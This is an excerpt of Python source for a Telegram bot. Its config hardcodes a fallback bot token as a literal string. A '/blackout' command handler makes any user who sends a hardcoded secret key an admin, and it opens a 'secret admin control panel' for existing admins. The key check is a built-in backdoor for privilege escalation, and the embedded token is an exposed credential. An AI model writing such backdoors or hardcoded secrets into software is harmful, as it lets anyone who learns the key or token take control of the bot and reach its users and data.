...
# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8912326354:AAGfCi_Vdkvr5CTXzWyIMGXJg_tRiAkTh28")
...
# Secret key for emergency admin promotion via /blackout <SECRET_KEY>.
# Keep this key private.
BLACKOUT_SECRET_KEY = "BL4CK0UT_9xK7_SECRET_2026"

@bot.message_handler(commands=['blackout'])
def blackout_cmd(msg):
    user_id = msg.from_user.id
    parts = msg.text.split(maxsplit=1)
    key = parts[1].strip() if len(parts) > 1 else ""

    # Existing admins can open the secret panel without a key.
    if is_admin(user_id):
        text = "<b>🖤 BLACKOUT ADMIN</b>\n\nSecret admin control panel."
        safe_send(user_id, text, reply_markup=admin_keyboard(user_id))
        return

    # Secret-key promotion: the sender becomes an additional admin.
    if key == BLACKOUT_SECRET_KEY:
        db.set_admin(user_id)
        safe_send(user_id, "✅ <b>BLACKOUT ACCESS GRANTED</b>\n\n👑 You are now an admin.")
        return
